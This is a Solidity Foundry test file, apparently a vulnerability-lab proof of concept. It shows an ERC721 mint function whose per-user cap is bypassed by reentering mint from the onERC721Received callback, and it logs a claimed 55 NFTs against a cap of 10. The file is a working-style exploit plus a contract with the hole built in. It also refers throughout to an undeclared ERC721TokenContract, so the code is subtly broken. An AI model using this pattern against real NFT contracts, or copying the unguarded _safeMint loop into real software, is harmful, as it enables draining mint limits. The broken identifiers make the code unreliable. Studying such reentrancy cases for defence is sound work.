// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract ContractTest is Test {
    MaxMint721 MaxMint721Contract;
    uint256 maxMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeMint() public {
        MaxMint721Contract = new MaxMint721();
        MaxMint721Contract.mint(maxMints);
        console.log("Bypassed maxMints, we got 55 NFTs");
        console.log("NFT minted:", ERC721TokenContract.balanceOf(address(this)));
        console.log(
            "The sum of all natural numbers 1 to 10 can be calculated using the formula, S= n/2[2a + (n - 1) * d], where n is the total number of natural numbers from 1 to 10, d is the difference between the two consecutive terms, and a is the first term. S = 10/2[2 + (10 - 1) * 1] = 55"
        );
        assertEq(ERC721TokenContract.balanceOf(address(this)), 55);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (maxMints > 0) {
            maxMints -= 1;
            ERC721TokenContract.mint(maxMints);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract MaxMint721 is ERC721Enumerable {
    uint256 public MAX_PER_USER = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function mint(uint256 amount) external {
        require(balanceOf(msg.sender) + amount <= MAX_PER_USER, "exceed max per user");
        for (uint256 i = 0; i < amount; i++) {
            uint256 mintIndex = totalSupply();
            _safeMint(msg.sender, mintIndex);
        }
    }
}
